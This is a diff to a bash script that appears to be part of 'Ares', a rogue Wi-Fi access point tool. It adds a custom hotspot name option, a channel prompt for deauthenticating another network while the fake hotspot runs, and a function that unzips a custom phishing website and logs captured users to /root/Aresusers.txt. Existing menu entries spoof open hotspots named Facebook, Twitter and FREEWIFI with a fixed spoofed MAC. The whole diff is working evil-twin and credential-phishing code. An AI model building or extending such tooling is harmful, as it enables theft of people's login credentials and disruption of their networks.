@@ -1000,7 +1000,8 @@ conditional_clear
 		echo -e "      "$blue"4)"$transparent" FREEWIFI       "
 		echo -e "      "$blue"5)"$transparent" Facebook       "
 		echo -e "      "$blue"6)"$transparent" Twitter       "
-		echo -e "      "$blue"7)"$red" Exit" $transparent
+		echo -e "      "$blue"7)"$transparent" Custom_name or channel?       "
+		echo -e "      "$blue"8)"$red" Exit" $transparent
 		echo "                                       "
 		echo -n "      #> "
 		read yn
@@ -1012,12 +1013,41 @@ conditional_clear
 			4 ) Host_SSID="FREEWIFI";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
 			5 ) Host_SSID="Facebook";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
 			6 ) Host_SSID="Twitter";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
-			7 ) exitmode; break;;
-			* ) echo "Unknown option. Please choose again"; conditional_clear ;;
+			7 ) Custom_name?; break;;
+			8 ) exitmode; break;;
+			* ) echo "Unknown option. Please choose again";conditional_clear ;;
 		  esac
 	done
 
 }
+function Custom_name? {
+		echo -n "Enter hotspot name    #> "
+		read cn
+		channelx
+	}
+function channelx {
+	echo -e "Enter channel if you want to deauth another network while hosting Ares's hotspot"
+	echo -n " Enter channel [press enter for default] #> "
+	read cx
+	case $cx in
+	1 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	2 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="2";channel="2";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	3 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="3";channel="3";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	4 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="4";channel="4";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	5 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="5";channel="5";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	6 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="6";channel="6";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	7 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="7";channel="7";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	8 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="8";channel="8";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	9 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="9";channel="9";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	10 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="10";channel="10";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	11 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="11";channel="11";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	12 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="12";channel="12";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	13 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="13";channel="13";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	14 ) Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="14";channel="14";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	* ) echo -e "This is not a channel number_- " && sleep 0.3 && echo -e "ignoring this channel number" && sleep 0.3 && echo -e "channel=1" && sleep 0.3 && Host_SSID="$cn";Host_ENC="OPEN";Host_CHAN="1";channel="1";speed="54";Host_MAC="C0:EE:FB:52:8B:45"; Host_MAC_MODEL="Telekom";fakeapmode="hostapd";authmode="hostapdAP";selectiontemplate; break;;
+	esac 
+	}
+
 function setinterface2 {
 
 	conditional_clear
@@ -2230,6 +2260,13 @@ mkdir $DUMP_PATH/data &>$ares_output_device
 
 [ -f /root/Twitterusers.txt ] || cp  $WORK_DIR/Sites/Twitter/Twitterusers.txt /root/Twitterusers.txt && echo  >> /root/Twitterusers.txt && echo -e "           "  >> /root/Twitterusers.txt && echo -e "             _____ _____________________ _________  "  >> /root/Twitterusers.txt && echo -e "            /  _  \\ _____   \_   _____//   _____/  "  >> /root/Twitterusers.txt && echo -e "           /  /_\  \|       _/|    __)_ \_____  \   "  >> /root/Twitterusers.txt && echo -e "          /    |    \    |   \|        \/        \  "  >> /root/Twitterusers.txt && echo -e "          \____|__  /____|_  /_______  /_______  /  "  >> /root/Twitterusers.txt && echo -e "                  \/       \/        \/        \/   "  >> /root/Twitterusers.txt && echo -e "          " && echo -e "               by princeofguilty & deltax           "  >> /root/Twitterusers.txt && echo -e "            "  >> /root/Twitterusers.txt && echo -e " Network ssid : $Host_SSID"  >> /root/Twitterusers.txt
 
+}
+function Customweb {
+	echo -e "Users will be found at Aresusers.txt"
+mkdir $DUMP_PATH/data &>$ares_output_device
+	unzip $WORK_DIR/Sites/Customwebsite/website.zip -d $DUMP_PATH/data
+
+[ -f /root/Aresusers.txt ] || cp  $WORK_DIR/Sites/Aresusers.txt /root/Aresusers.txt && echo  >> /root/Aresusers.txt && echo -e "           "  >> /root/Aresusers.txt && echo -e "             _____ _____________________ _________  "  >> /root/Aresusers.txt && echo -e "            /  _  \\ _____   \_   _____//   _____/  "  >> /root/Aresusers.txt && echo -e "           /  /_\  \|       _/|    __)_ \_____  \   "  >> /root/Aresusers.txt && echo -e "          /    |    \    |   \|        \/        \  "  >> /root/Aresusers.txt && echo -e "          \____|__  /____|_  /_______  /_______  /  "  >> /root/Aresusers.txt && echo -e "                  \/       \/        \/        \/   "  >> /root/Aresusers.txt && echo -e "          " && echo -e "               by princeofguilty & deltax           "  >> /root/Aresusers.txt && echo -e "            "  >> /root/Aresusers.txt && echo -e " Network ssid : $Host_SSID"  >> /root/Aresusers.txt
 }
 
 ######################################### < INTERFACE WEB > ########################################
